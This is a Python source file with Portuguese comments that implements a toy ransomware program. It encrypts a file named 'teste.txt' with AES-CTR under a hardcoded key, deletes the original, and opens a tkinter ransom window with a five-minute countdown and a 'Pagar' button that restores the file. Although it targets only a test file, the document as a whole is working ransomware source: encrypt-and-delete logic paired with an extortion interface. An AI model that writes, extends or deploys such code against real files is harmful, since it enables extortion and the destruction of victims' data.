import os
import pyaes
import tkinter as tk
from tkinter import messagebox
import threading
import time

# Função para criptografar o arquivo
def encrypt_file(file_name, key):
    with open(file_name, "rb") as file:
        file_data = file.read()

    aes = pyaes.AESModeOfOperationCTR(key)
    crypto_data = aes.encrypt(file_data)

    new_file_name = file_name + ".ransomwaretroll"
    with open(new_file_name, 'wb') as new_file:
        new_file.write(crypto_data)

    os.remove(file_name)

# Função para descriptografar o arquivo
def decrypt_file(file_name, key):
    with open(file_name, "rb") as file:
        file_data = file.read()

    aes = pyaes.AESModeOfOperationCTR(key)
    decrypt_data = aes.decrypt(file_data)

    os.remove(file_name)

    new_file_name = file_name.replace(".ransomwaretroll", "")
    with open(new_file_name, "wb") as new_file:
        new_file.write(decrypt_data)

# Função para o botão "Pagar"
def pay_ransom():
    decrypt_file("teste.txt.ransomwaretroll", key)
    messagebox.showinfo("Ransomware", "Pagamento realizado! Seus arquivos foram restaurados.")
    root.destroy()

# Função do timer
def countdown(time_left):
    while time_left > 0:
        mins, secs = divmod(time_left, 60)
        timer_display.set(f'Tempo restante: {mins:02d}:{secs:02d}')
        time.sleep(1)
        time_left -= 1

    messagebox.showwarning("Ransomware", "O tempo acabou! Seus arquivos foram comprometidos.")
    root.destroy()

# Configuração da janela principal
root = tk.Tk()
root.title("Ransomware")

timer_display = tk.StringVar()
timer_display.set("Tempo restante: 05:00")

# Interface gráfica
label = tk.Label(root, text="Seus arquivos foram criptografados!", font=("Arial", 14))
label.pack(pady=20)

timer_label = tk.Label(root, textvariable=timer_display, font=("Arial", 12))
timer_label.pack(pady=10)

pay_button = tk.Button(root, text="Pagar", command=pay_ransom, font=("Arial", 12))
pay_button.pack(pady=20)

# Definir o tempo (em segundos)
total_time = 5 * 60  # 5 minutos

# Iniciar o timer em uma thread separada
threading.Thread(target=countdown, args=(total_time,)).start()

# Chave de criptografia e nome do arquivo
key = b"testeransomwares"
file_name = "teste.txt"

# Criptografar o arquivo
encrypt_file(file_name, key)

# Iniciar o loop da interface gráfica
root.mainloop()
